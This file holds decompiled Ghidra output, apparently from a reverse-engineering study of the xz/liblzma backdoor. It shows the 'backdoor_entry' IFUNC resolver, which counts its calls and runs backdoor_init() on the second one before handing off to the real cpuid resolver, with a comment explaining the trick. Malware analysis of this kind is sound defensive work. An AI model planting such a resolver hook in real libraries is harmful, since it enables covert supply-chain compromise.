// /home/kali/xzre-ghidra/xzregh/10A720_backdoor_entry.c
// Function: backdoor_entry @ 0x10A720
// Calling convention: unknown
// Prototype: undefined backdoor_entry(void)


/*
 * AutoDoc: IFUNC resolver entry point. It increments a global invocation counter, calling
 * `backdoor_init()` on the second pass so the loader can stage its hooks while glibc thinks it is
 * still choosing a cpuid implementation. Regardless of setup, it finally delegates to
 * `_cpuid_gcc` to satisfy liblzma’s original resolver contract.
 */
#include "xzre_types.h"


undefined4 backdoor_entry(undefined4 param_1,undefined8 param_2)

{
  undefined8 uVar1;
  undefined4 c;
  undefined1 d [4];
  undefined1 state [4];
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  
  uVar1 = 0;
  if (resolver_call_count == 1) {
    local_48 = 1;
    local_40 = 0;
    local_38 = 0;
    local_30 = 0;
    local_28 = 0;
    local_20 = param_2;
    backdoor_init(&local_48);
    uVar1 = param_2;
  }
  resolver_call_count = resolver_call_count + 1;
  _cpuid_gcc(param_1,&c,d,state,&local_48,uVar1);
  return c;
}

